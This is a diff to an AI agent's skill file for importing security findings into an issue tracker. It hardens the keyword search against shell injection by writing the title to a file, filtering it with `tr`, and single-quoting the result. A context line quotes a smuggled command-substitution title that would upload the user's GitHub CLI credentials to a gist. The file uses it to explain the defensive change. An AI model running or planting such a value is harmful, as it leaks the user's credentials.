@@ -27,7 +27,7 @@ argument-hint: "[path-to-markdown-file]"
 capability: capability:intake
 surface_hash: sha256:a0bf5966806f210a
 license: Apache-2.0
-measured_tokens: 6678
+measured_tokens: 6799
 ---
 
 <!-- Placeholder convention (see AGENTS.md#placeholder-convention-used-in-skill-files):
@@ -225,13 +225,22 @@ a title like `RCE in $(gh gist create ~/.config/gh/hosts.yml) handler` would sur
 `file_path: <scratch>/import-md-<basename>-<index>-kw.txt`,
 `content: <raw-title-keyword>`
 
-Then:
+Then clean it:
+
 ```bash
-TITLE_KEYWORD=$(tr -cd 'A-Za-z0-9._ -' \
-  < <scratch>/import-md-<basename>-<index>-kw.txt)
-gh search issues "$TITLE_KEYWORD" --repo <tracker> \
+tr -cd 'A-Za-z0-9._ -' < <scratch>/import-md-<basename>-<index>-kw.txt > <scratch>/import-md-<basename>-<index>-kw.clean.txt
+```
+
+Read the cleaned file, and search with its content single-quoted:
+
+```bash
+gh search issues '<cleaned keyword>' --repo <tracker> \
   --json number,title,state,url
 ```
+
+The Write tool puts the raw bytes on disk without shell tokenisation, and `tr -cd` leaves only letters, digits, `.`, `_`, space and `-`,
+so the cleaned string is safe inside single quotes.
+Run the two commands separately and keep the `gh` call plain: a `gh` inside `$(…)`, a pipe, or a command that also sets a variable stays sandboxed under the secure setup and fails.
 
 Pick `<raw-title-keyword>` as the most distinctive 3-5 word
 substring from the finding's title (drop common security words
